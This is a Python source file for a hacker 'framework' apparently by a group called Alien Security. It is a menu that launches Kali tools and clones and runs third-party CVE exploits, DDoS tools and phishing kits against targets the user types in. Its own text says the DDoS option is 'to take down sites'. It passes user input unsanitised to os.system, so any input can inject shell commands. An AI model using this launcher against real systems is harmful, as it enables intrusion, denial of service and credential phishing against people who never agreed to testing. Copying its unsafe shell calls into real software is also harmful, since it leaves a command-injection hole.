import sys, os
import urllib
import time
import webbrowser
class color:
    HEADER = '\033[0m'
warnscan = color.HEADER + '''
  ▒█████░    ▓████▒   ▒████▓   ██░████
 ████████   ███████   ██████▓  ███████▓
 ██▒  ░▒█  ▓██▒  ▒█   █▒  ▒██  ███  ▒██
 █████▓░   ██░         ▒█████  ██    ██
 ░██████▒  ██        ░███████  ██    ██
    ░▒▓██  ██░       ██▓░  ██  ██    ██
 █▒░  ▒██  ▓██▒  ░█  ██▒  ███  ██    ██
 ████████   ███████  ████████  ██    ██
 ░▓████▓     ▓████▒   ▓███░██  ██    ██'''
warnvulner = color.HEADER + '''

                     ████
                     ████
                       ██
 ██▒  ▒██  ██    ██    ██      ██░████    ░████▒    ██░████   ▒█████░
 ▓██  ██▓  ██    ██    ██      ███████▓  ░██████▒   ███████  ████████
 ▒██  ██▒  ██    ██    ██      ███  ▒██  ██▒  ▒██   ███░     ██▒  ░▒█
  ██░░██   ██    ██    ██      ██    ██  ████████   ██       █████▓░
  ██▒▒██   ██    ██    ██      ██    ██  ████████   ██       ░██████▒
  ▒████▒   ██    ██    ██      ██    ██  ██         ██          ░▒▓██
   ████    ██▒  ███    ██▒     ██    ██  ███░  ▒█   ██       █▒░  ▒██
   ████    ▓███████    █████   ██    ██  ░███████   ██       ████████
   ▒██▒     ▓███░██    ░████   ██    ██   ░█████▒   ██       ░▓████▓'''
warnsql = color.HEADER + '''

  ▒████▒    ░████░   ██
 ▒██████    ██████   ██
 ██▒  ▒█   ▒██  ██▒  ██
 ██        ██▒  ▒██  ██
 ███▒      ██    ██  ██
 ▒█████▒   ██    ██  ██
  ░█████▒  ██    ██  ██
     ▒███  ██    ██  ██
       ██  ██▒  ▒██  ██
 █▒░  ▒██  ▒██  ██▓  ██
 ███████▒   ██████░  ████████
 ░█████▒    ░█████   ████████
               ░██▒
                ░█'''
warnexploit = color.HEADER + '''

                                                      ██
 ████████                      ████                   ██
 ████████                      ████                   ██       ██
 ██                              ██                            ██
 ██        ███  ███  ██░███▒     ██       ░████░    ████     ███████    ▒█████░
 ██         ██▒▒██   ███████▒    ██      ░██████░   ████     ███████   ████████
 ███████    ▒████▒   ███  ███    ██      ███  ███     ██       ██      ██▒  ░▒█
 ███████     ████    ██░  ░██    ██      ██░  ░██     ██       ██      █████▓░
 ██          ▒██▒    ██    ██    ██      ██    ██     ██       ██      ░██████▒
 ██          ████    ██░  ░██    ██      ██░  ░██     ██       ██         ░▒▓██
 ██         ▒████▒   ███  ███    ██▒     ███  ███     ██       ██░     █▒░  ▒██
 ████████   ██▒▒██   ███████▒    █████   ░██████░  ████████    █████   ████████
 ████████  ███  ███  ██░███▒     ░████    ░████░   ████████    ░████   ░▓████▓
                     ██
                     ██
                     ██'''
warnwifi = color.HEADER + '''


              ██                  ██
██      ██    ██       ▒████      ██
██░    ░██    ██       █████      ██
██▒    ▒██             ██
▓█▒ ██ ▒█▓  ████     ███████    ████
▒█▓░██ ██▒  ████     ███████    ████
▒██░██░██▒    ██       ██         ██
░██▒██▒██░    ██       ██         ██
 ██▓▓▓▓██░    ██       ██         ██
 ███▒▒███     ██       ██         ██
 ███░░███     ██       ██         ██
 ███  ███  ████████    ██      ████████
 ▓██  ███  ████████    ██      ████████'''
warnddos = color.HEADER + '''
 █████▒    █████▒               ▒████▒
 ███████   ███████             ▒██████
 ██  ▒██▒  ██  ▒██▒            ██▒  ▒█
 ██   ▒██  ██   ▒██   ░████░   ██
 ██   ░██  ██   ░██  ░██████░  ███▒
 ██    ██  ██    ██  ███  ███  ▒█████▒
 ██    ██  ██    ██  ██░  ░██   ░█████▒
 ██   ░██  ██   ░██  ██    ██      ▒███
 ██   ▒██  ██   ▒██  ██░  ░██        ██
 ██  ▒██▒  ██  ▒██▒  ███  ███  █▒░  ▒██
 ███████   ███████   ░██████░  ███████▒
 █████▒    █████▒     ░████░   ░█████▒'''
warnapach = color.HEADER + '''

   ▒██▒                                  ██
   ▓██▓                                  ██
   ████                                  ██
   ████    ██░███▒    ▒████▓     ▓████▒  ██░████    ░████▒
  ▒█▓▓█▒   ███████▒   ██████▓   ███████  ███████▓  ░██████▒
  ▓█▒▒█▓   ███  ███   █▒  ▒██  ▓██▒  ▒█  ███  ▒██  ██▒  ▒██
  ██  ██   ██░  ░██    ▒█████  ██░       ██    ██  ████████
  ██████   ██    ██  ░███████  ██        ██    ██  ████████
 ░██████░  ██░  ░██  ██▓░  ██  ██░       ██    ██  ██
 ▒██  ██▒  ███  ███  ██▒  ███  ▓██▒  ░█  ██    ██  ███░  ▒█
 ███  ███  ███████▒  ████████   ███████  ██    ██  ░███████
 ██▒  ▒██  ██░███▒    ▓███░██    ▓████▒  ██    ██   ░█████▒
           ██
           ██
           ██'''
warnsocial = color.HEADER + '''
                                  ██
  ▒████▒                          ██               ████
 ▒██████                          ██               ████
 ██▒  ▒█                                             ██
 ██         ░████░     ▓████▒   ████      ▒████▓     ██
 ███▒      ░██████░   ███████   ████      ██████▓    ██
 ▒█████▒   ███  ███  ▓██▒  ▒█     ██      █▒  ▒██    ██
  ░█████▒  ██░  ░██  ██░          ██       ▒█████    ██
     ▒███  ██    ██  ██           ██     ░███████    ██
       ██  ██░  ░██  ██░          ██     ██▓░  ██    ██
 █▒░  ▒██  ███  ███  ▓██▒  ░█     ██     ██▒  ███    ██▒
 ███████▒  ░██████░   ███████  ████████  ████████    █████
 ░█████▒    ░████░     ▓████▒  ████████   ▓███░██    ░████
'''
time.sleep(1)
os.system("clear")
os.system("figlet -f bubble a")
time.sleep(1)
os.system("clear")
os.system("figlet -f bubble al")
time.sleep(1)
os.system("clear")
os.system("figlet -f bubble ali")
time.sleep(1)
os.system("clear")
os.system("figlet -f bubble alie")
time.sleep(1)
os.system("clear")
os.system("figlet -f bubble alien")
print("      Framework")
time.sleep(2)
os.system("clear")


class color:
    HEADER = '\033[0m'



logo = color.HEADER + '''
                 _     _       .      .        |"|          _   _
     ___       o' \,=./ `o   .  .:::.         _|_|_        '\\-//`
    (o o)         (o o)        :(o o):  .     (o o)         (o o)
ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-
            This framework is only for KALI LINUX/PARROT OS

     _______  _       _________ _______  _
    (  ___  )( \      \__   __/(  ____ \( (    /|
    | (   ) || (         ) (   | (    \/|  \  ( |
    | (___) || |         | |   | (__    |   \ | |
    |  ___  || |         | |   |  __)   | (\ \) |
    | (   ) || |         | |   | (      | | \   |
    | )   ( || (____/\___) (___| (____/\| )  \  |
    |/     \|(_______/\_______/(_______/|/    )_) Framework

            by the Alien Security Brokers.
'''
print(logo)
mainmeny = color.HEADER + ''' 

={ 1 } Information getting.
={ 2 } Vulnerability Scanning 
={ 3 } Sql injections.
={ 4 } Exploitation tools.
={ 5 } wifi cracking.
={ 6 } M0re information.
={ 7 } Distributed Denial of Service.
={ 8 } Run the APACHE on your IP address.
={ 9 } Social Engineering. 
={ 10 } Fun menu.
={ 11 } Install tools menu.
={ 12 } My Github accaunt.
'''
scanning = color.HEADER + '''
={ 1 } Nmap 
={ 2 } Nikto 
={ 3 } Recon-ng 
={ 4 } Zenmap
'''
vulnerebility = color.HEADER + '''
={ 1 } Golismero
={ 2 } Lynis
'''
database = color.HEADER + '''
={ 1 } SQLMAP 
={ 2 } jsql (parrotOS)
'''
exploittools = color.HEADER + '''
={ 1 } Metasploit
={ 2 } CVE Exploits 
={ 3 } Start BeEF
={ 4 } Start Armitage
={ 5 } Start Ghost Phisher
'''
wificracking = color.HEADER + '''
={ 1 } Wifite
'''
theend = color.HEADER + '''
 __                 __             __
|  |_.-----.-----. |  |--.---.-.--|  |
|   _|  _  |  _  | |  _  |  _  |  _  |
|____|_____|_____| |_____|___._|_____|
 '''
informationboard = color.HEADER + '''

                 _     _       .      .        |"|          _   _
     ___       o' \,=./ `o   .  .:::.         _|_|_        '\\-//`
    (o o)         (o o)        :(o o):  .     (o o)         (o o)
ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-


 _______  _       _________ _______  _
(  ___  )( \      \__   __/(  ____ \( (    /|
| (   ) || (         ) (   | (    \/|  \  ( |
| (___) || |         | |   | (__    |   \ | |
|  ___  || |         | |   |  __)   | (\ \) |
| (   ) || |         | |   | (      | | \   |
| )   ( || (____/\___) (___| (____/\| )  \  |
|/     \|(_______/\_______/(_______/|/    )_) Framework

            by the ąƖıɛŋ ʂɛƈųrıɬყ.


Contact us:
0000000000000000000000000000000000000000000000000000000

MAIL: aliensecurity@yandex.ru
SOCIALMIDEAS: https://vk.com/eternalbluehack
              https://twitter.com/isitahacker
              https://github.com/colorblindpentester
              
0000000000000000000000000000000000000000000000000000000

FAQ:       
1 How to join our team?
    -Write to me at vk.com
2 Who are us?
    -Team of hackers and coders.
3 What is this script for?
    -It will help you want to pentest.
    
                        ██
           ████         ██
           ████         ██
             ██
  ▒████▓     ██       ████      ░████▒   ██░████
  ██████▓    ██       ████     ░██████▒  ███████▓
  █▒  ▒██    ██         ██     ██▒  ▒██  ███  ▒██
   ▒█████    ██         ██     ████████  ██    ██
 ░███████    ██         ██     ████████  ██    ██
 ██▓░  ██    ██         ██     ██        ██    ██
 ██▒  ███    ██▒        ██     ███░  ▒█  ██    ██
 ████████    █████   ████████  ░███████  ██    ██
  ▓███░██    ░████   ████████   ░█████▒  ██    ██ 
    
0000000000000000000000000000000000000000000000000000000

About script:

Alien-Framework - A framework what will help you with pentesting. This script was written by the AlienSecurity.
It uses the pre-installed tools if Kali/ParrotOS to help you. Remember, this framework WONT work in other Operation
systems! The Alien Security is not responsible for all damage what was done by using this framework.

1 info getting - scanning a host/ip.
2 vulnerability scan - scanning a host/ip to find vulnerability's.
3 SQL injections - tools to exploit a vulnerability's in sql.
4 Exploits.... - metasploit, and some exploits...
5 Wifi cracking - wifire. (auto wifi cracking tool)
6 M0re information - this is it.
7 DDoS - to take down sites/IP's/SSL.
8 Apache run - just runs a apache on your IP.
9 Social Engineering - 0_o
10 Fun - Fun. 
11 Install tools menu - just it will install some tools.
12 My Github accaunt - ....you now what is a GitHub right?...

   |             _     _
   |.===.      o' \,=./ `o    `  _ ,  '
   {}o o{}        (o o)      -  (o)o)  -
ooO--(_)--Ooo-ooO--(_)--Ooo--ooO'(_)--Ooo- 
'''
ddosatt = color.HEADER + '''
={ 1 } THC-SSL-DOS. (Parrot OS)
={ 2 } Memcrashed-DDoS-Exploit.
={ 3 } UfoNet.
'''
setools = color.HEADER + '''
={ 1 } Social Engineering ToolKit.
={ 2 } Ghost-Phisher.
={ 3 } SocialFish
'''
fffun = color.HEADER + '''
={ 1 } Figlet.
={ 2 } print logo.
'''
exploitfrompack = color.HEADER + '''
={ 1 } CVE-2016-10033
={ 2 } CVE-2017-3169
={ 3 } CVE-2017-7269
={ 4 } CVE-2017-7269-2
={ 5 } CVE-2017-7679
={ 6 } CVE-2017-8295
={ 7 } CVE-2017-9798
={ 8 } CVE-2017-9805
={ 9 } CVE-2017-10271
={ 10 } CVE-2017-12617
={ 11 } CVE-2017-15412
={ 12 } CVE-2018-7600
={ 13 } CVE-2019-6340
={ 14 } CVE-2017-5638

'''
toolstoinstall = color.HEADER + '''
                              ████
   ██                          ████
   ██                            ██
 ███████    ░████░    ░████░     ██       ▒█████░
 ███████   ░██████░  ░██████░    ██      ████████
   ██      ███  ███  ███  ███    ██      ██▒  ░▒█
   ██      ██░  ░██  ██░  ░██    ██      █████▓░
   ██      ██    ██  ██    ██    ██      ░██████▒
   ██      ██░  ░██  ██░  ░██    ██         ░▒▓██
   ██░     ███  ███  ███  ███    ██▒     █▒░  ▒██
   █████   ░██████░  ░██████░    █████   ████████
   ░████    ░████░    ░████░     ░████   ░▓████▓
   
={ 1 } Install a Lazy Script.
={ 2 } Install some DDoS Tools.
={ 3 } Install toilet.
={ 4 } Install cmatrix.
={ 5 } Install Some more CVE Exploits. (I will add it to "Exploits" menu)
={ 6 } Install CrashCast-Exploits.
'''
start = input("Enter 1 to start. Enter 2 to exit: ")
if start =="1":
    os.system("clear")
    print(mainmeny)
    aliensec = input("\033[1;31;40m <AlienConsole ==>> ")
    if aliensec =="1":
        print(warnscan)
        print(scanning)
        scanningstart = input("\033[1;31;40m <AlienConsole ==>> ")
        if scanningstart =="1":
            os.system("clear")
            os.system("figlet NMAP SCAN")
            host = input("Enter a target: ")
            os.system("nmap -A -Pn %s" % host)
        if scanningstart =="2":
            os.system("clear")
            os.system("figlet NIKTO SCAN")
            niktohost = input("Enter a target: ")
            niktoport = input("Enter a port to scan: ")
            os.system("nikto -host %s -p %s" % (niktohost, niktoport))
        if scanningstart =="3":
            os.system("clear")
            os.system("figlet RECON-NG")
        if scanningstart =="4":
            os.system("clear")
            os.system("zenmap")
    if aliensec =="2":
        print(warnvulner)
        print(vulnerebility)
        vulnerstart = input("\033[1;31;40m <AlienConsole ==>> ")
        if vulnerstart =="1":
            os.system("clear")
            os.system("figlet GOLISMERO")
            golishost = input("Input a target here: ")
            os.system("golismero -scan %s" % golishost)
        if vulnerstart =="2":
            os.system("clear")
            os.system("figlet Lynis")
            os.system("lynis audit system")
    if aliensec =="3":
        print(warnsql)
        print(database)
        datatool = input("\033[1;31;40m <AlienConsole ==>> ")
        if datatool =="1":
            os.system("clear")
            os.system("figlet sqlmap")
            sqltarget = input("<AlienConsole> Enter a target to exploit: ")
            os.system("sqlmap -u %s --random-agent --dbs" % sqltarget )
        if datatool =="3":
            os.system("clear")
            os.system("figlet jsql")
            os.system("jsql")
    if aliensec =="4":
        print(warnvulner)
        print(exploittools)
        exploitsss = input("\033[1;31;40m <AlienConsole ==>> ")
        if exploitsss =="1":
            os.system("msfconsole")
        if exploitsss =="2":
            os.system("clear")
            os.system("figlet CVE-EXPLOITS")
            os.system("git clone https://github.com/gottburgm/Exploits CVEALIEN")
            os.system("cd CVEALIEN")
            print(exploitfrompack)
            targeturl = input("<AlienConsole> Enter a URL to test: ")
            fuckingcve = input("<AlienConsole> What exploit do you want to use? ")
            apachedir = input("<AlienConsole> Enter a apache install path: ")
            if fuckingcve =="1":
                os.system("clear")
                os.system("figlet CVE-EXPLOIT")
                print("CVE-2016-10033")
                os.system("cd CVEALIEN && cd CVE-2016-10033 && perl CVE_2016_10033.pl %s " % targeturl )
            if fuckingcve =="2":
                os.system("clear")
                os.system("figlet CVE-EXPLOIT")
                print("CVE-2017-3169")
                os.system("cd CVEALIEN && cd CVE-2017-3169 && perl CVE_2017_3169.pl %s --apache-dir %s" % (targeturl, apachedir))
            if fuckingcve =="3":
                install = input("Install it? y/n: ")
                if install =="y":
                    print("installing")
                    os.system("cd CVEALIEN && cd CVE-2017-7269 && chmod +x install.sh && ./install.sh")
                if install =="n":
                    print("Launching...")
                    time.sleep(1)
                    os.system("perl CVE_2017_7269.pl")
            if fuckingcve =="4":
                print("It is not done yet, use the 1st version (3)")
            if fuckingcve =="5":
                os.system("clear")
                os.system("figlet CVE-EXPLOIT")
                os.system("cd CVEALIEN cd CVE-2017-7679 && perl CVE_2017_7679.pl %s %s"  % (targeturl, apachedir))
            if fuckingcve =="6":
                os.system("clear")
                os.system("figlet CVE-EXPLOIT")
                os.system("cd CVEALIEN cd CVE-2017-8295 && perl CVE_2017_8295.pl %s " % targeturl )
            if fuckingcve =="7":
                os.system("clear")
                os.system("figlet CVE-EXPLOIT")
                os.system("cd CVEALIEN cd CVE-2017-9798 && perl reproducel.pl %s " % targeturl)
            if fuckingcve =="8":
                os.system("clear")
                os.system("figlet CVE-EXPLOIT")
                istall232 = input("Install? y/n: ")
                if istall232 =="y":
                    os.system("clear")
                    os.system("figlet Installing...")
                    os.system("cd CVEALIEN cd CVE-2017-9805 && chmod +x install.sh && ./install.sh")
                if istall232 =="n":
                    os.system("clear")
                    os.system("figlet CVE-EXPLOIT")
                    os.system("cd CVEALIEN cd CVE-2017-9798 && perl CVE_2017_9798.pl %s " % targeturl)
            if fuckingcve =="9":
                os.system("clear")
                os.system("figlet CVE-EXPLOIT")
                os.system("cd CVE-2017-10271")
                print("Sorry... It is still not done... I will fix it... Maybe...")
            if fuckingcve =="10":
                os.system("clear")
                os.system("figlet CVE-EXPLOIT")
                os.system("cd CVEALIEN && cd CVE-2017-12617 && perl CVE_2017_12617.pl %s " % targeturl)
            if fuckingcve =="11":
                os.system("clear")
                os.system("figlet CVE-EXPLOIT")
                istall2322 = input("Install first? y/n: ")
                if istall2322 =="y":
                    os.system("clear")
                    os.system("figlet Installing...")
                    os.system("cd CVEALIEN cd CVE-2017-15412 && chmod +x install.sh && ./install.sh")
                if istall2322 =="n":
                    os.system("clear")
                    os.system("figlet CVE-EXPLOIT")
                    os.system("cd CVEALIEN && cd CVE-2017-15412 && perl CVE_2017_15412.pl %s" % targeturl)
            if fuckingcve =="12": #CVE-2018-7600
                os.system("clear")
                os.system("figlet CVE-EXPLOIT")
                istall23222 = input("Install first? y/n: ")
                if istall23222 == "y":
                    os.system("clear")
                    os.system("figlet Installing...")
                    os.system("cd CVEALIEN cd CVE-2018-7600 && chmod +x install.sh && ./install.sh")
                if istall23222 == "n":
                    os.system("clear")
                    os.system("figlet CVE-EXPLOIT")
                    os.system("cd CVEALIEN && cd CVE-2018-7600 && perl CVE_2018_7600.pl %s" % targeturl)
            if fuckingcve =="13":
                #CVE-2019-6340
                istall232222 = input("Install first? y/n: ")
                if istall232222 == "y":
                    os.system("clear")
                    os.system("figlet Installing...")
                    os.system("cd CVEALIEN cd CVE-2019-6340 && chmod +x install.sh && ./install.sh")
                if istall232222 == "n":
                    os.system("clear")
                    os.system("figlet CVE-EXPLOIT")
                    os.system("cd CVEALIEN && cd CVE-2019-6340 && perl CVE_2019_6340.pl %s" % targeturl)
            if fuckingcve =="14":
                os.system("clear")
                os.system("figlet CVE-EXPLOIT")
                os.system("git clone https://github.com/colorblindpentester/CVE-2017-5638 CVEaliensec2 && cd CVEaliensec2")
                os.system("python2 struts2_S2-045.py %s" % targeturl)
        if exploitsss =="3":
            os.system("clear")
            os.system("figlet BeEF")
            os.system("beef-xss")
    if aliensec =="5":
        print(warnwifi)
        print(wificracking)
        wcrack = input("\033[1;31;40m <AlienConsole ==>> ")
        if wcrack =="1":
            os.system("clear")
            os.system("figlet WIFITE")
            os.system("wifite")
    if aliensec =="6":
        os.system("clear")
        os.system("figlet info")
        print(informationboard)
    if aliensec =="7":
        print(warnddos)
        print(ddosatt)
        dtools = input("\033[1;31;40m <AlienConsole ==>> ")
        if dtools =="2":
            os.system("clear")
            os.system("figlet Memcrashed")
            os.system("git clone https://github.com/649/Memcrashed-DDoS-Exploit maf123")
            os.system("cd maf123 && python3 Memcrashed.py")
        if dtools =="1":
            os.system("clear")
            os.system("figlet SSL-DOS")
            sslip = input("<AlienConsole> Enter a target's IP address: ")
            sslport = input("<AlienConsole> Enter a SSL port to attack on: ")
            os.system("thc-ssl-dos %s %s --accept" % (sslip, sslport))
        if dtools =="3":
            os.system("clear")
            os.system("figlet ufonet")
            os.system("git clone https://code.03c8.net/epsylon/ufonet ufoalienF")
            os.system("cd ufoalienF")
            os.system("./ufonet")
    if aliensec =="8":
        os.system("clear")
        print(warnapach)
        os.system("sudo service apache2 start")
    if aliensec =="9":
        os.system("clear")
        print(warnsocial)
        print("<AlienConsole> Wait a little bit...")
        time.sleep(1)
        print(setools)
        socialgayscripts = input("\033[1;31;40m <AlienConsole ==>> ")
        if socialgayscripts =="1":
            os.system("clear")
            os.system("figlet SET")
            os.system("setoolkit")
        if socialgayscripts =="2":
            os.system("clear")
            os.system("figlet GhostP")
            os.system("ghost-phisher")
        if socialgayscripts =="3":
            os.system("clear")
            os.system("figlet SocialFish")
            os.system("git clone https://github.com/UndeadSec/SocialFish sffaf")
            os.system("cd sffaf && python3 SocialFish root toor")
            os.system("pip3 install -r requirements.txt")
            os.system("python3 SocialFishpy")
    if aliensec =="10":
        print(fffun)
        ffuma = input("\033[1;31;40m <AlienConsole ==>> ")
        if ffuma =="1":
            os.system("clear")
            os.system("figlet FIGLET")
            figlettext = input("What do you want to write? ")
            figletfont = input("Choose a font: ")
            os.system("figlet -f %s %s" % (figletfont, figlettext))
        if ffuma =="2":
            os.system("clear")
            print(logo)
    if aliensec =="11":
        os.system("clear")
        print(toolstoinstall)
        intools = input("\033[1;31;40m <AlienConsole ==>> ")
        if intools =="1":
            os.system("clear")
            os.system("cd")
            os.system("git clone https://github.com/arismelachroinos/lscript.git")
            os.system("cd lscript")
            os.system("chmod +x install.sh")
            os.system("./install.sh")
            print("Wait until install will stop, and start lazy script by typing 'l' in term.")
        if intools =="2":
            print("Well, lets install Saddam")
            os.system("cd")
            os.system("git clone https://github.com/OffensivePython/Saddam")
            os.system("cd Saddam")
            print("done!")
            time.sleep(2)
            os.system("clear")
            print("ok Saddam is done. Lets install Saint-Attacker!")
            os.system("cd")
            os.system("git clone https://github.com/colorblindpentester/Saint-Attacker")
            os.system("cd Saint-Attacker")
            print("Now wait until other tools will be installed")
            time.sleep(2)
            os.system("clear")
            os.system("cd")
            print("Now i am going to install hammer.")
            os.system("git clone https://github.com/cyweb/hammer")
            print("Done!")
            time.sleep(2)
            os.system("clear")
            print("Done.")
        if intools =="3":
            os.system("clear")
            os.system("apt-get install toilet")
        if intools =="4":
            os.system("clear")
            os.system("apt-get install cmatrix")
            print("to start 'cmatrix")
        if intools =="5":
            os.system("clear")
            os.system("git clone https://github.com/lcashdol/Exploits alienexploits")
            os.system("cd alienexploits && ls")
            print("Done.")
        if intools =="6":
            os.system("clear")
            os.system("cd && git clone https://github.com/649/Crashcast-Exploit cd Crashcast-Exploit")
            print("Done.")
    if aliensec =="12":
        os.system("clear")
        print("\033[1;31;40m <AlienConsole ==>> Welcome!")
        webbrowser.open_new_tab("https://github.com/colorblindpentester")
elif start =="2":
    os.system("clear")
    print("\033[1;31;40m <AlienConsole ==>> ok.")
    print(theend)